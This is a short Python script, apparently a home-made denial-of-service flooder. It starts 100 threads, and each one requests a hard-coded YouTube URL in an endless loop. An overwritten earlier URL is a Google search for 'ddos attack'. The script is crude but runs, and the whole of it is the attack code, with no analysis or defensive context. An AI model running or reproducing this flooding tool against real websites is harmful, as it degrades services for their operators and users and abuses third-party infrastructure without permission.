'''
Created on 15.03.2021

@author: peter
'''
import requests
import threading


uri = "https://www.google.com/search?source=hp&ei=ptZPYPipDJPzkgWQprTQBg&iflsig=AINFCbYAAAAAYE_ktt7ko7Y_2PCesQYaOcTWog0PO3Jf&q=ddos+attack&oq=ddos+attack&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAELEDMgIIADICCAAyAggAMgIIADICCAAyAggAMgIIADICCAAyAggAOggIABCxAxCDAToLCAAQsQMQxwEQowI6CAguELEDEIMBOg4IABCxAxCDARDHARCjAjoICC4QsQMQkwI6DQgAELEDEMcBEKMCEAo6AgguUNMqWOJBYNpEaAJwAHgAgAFuiAGbCJIBBDEwLjGYAQCgAQGqAQdnd3Mtd2l6sAEA&sclient=gws-wiz&ved=0ahUKEwj4lKboo7PvAhWTuaQKHRATDWoQ4dUDCAk&uact=5"
 
uri = "https://realpython.com/python-requests/"

uri = "https://www.youtube.com/watch?v=WBxGW6azeiE"

#uri = "https://www.youtube.com/watch?v=i8N--LA5E14"
#global count 
#count = 1 

def req():
    count = 0
    while True :
        r = requests.get(uri)
        
        print( 'count:' , count , "r.status_code", r.status_code , f'{r.headers["content-type"]}', r.headers['content-type'] )
        count += 1
    
for _ in range(100):
    x = threading.Thread(target=req,args=())
    x.start() 
